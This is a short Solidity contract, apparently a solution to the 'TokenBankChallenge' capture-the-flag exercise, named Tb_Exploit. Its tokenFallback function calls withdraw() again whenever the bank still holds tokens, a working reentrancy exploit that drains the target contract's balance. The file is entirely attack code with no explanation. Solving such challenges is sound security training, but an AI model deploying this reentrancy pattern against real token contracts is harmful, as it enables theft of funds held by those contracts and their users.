pragma solidity ^0.8.0;

interface TokenBankChallenge {
    function isComplete() external view returns (bool);

    function token() external view returns (address);

    function balanceOf(address) external view returns (uint256);

    function withdraw(uint256 amount) external;
}

interface Token {
    function balanceOf(address) external view returns (uint256);
}

contract Tb_Exploit {
    TokenBankChallenge public tb;

    function set(address _address) public {
        tb = TokenBankChallenge(_address);
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes calldata data
    ) public {
        if (Token(tb.token()).balanceOf(address(tb)) > 0) {
            withdraw();
        }
    }

    function withdraw() public {
        tb.withdraw(tb.balanceOf(address(this)));
    }
}
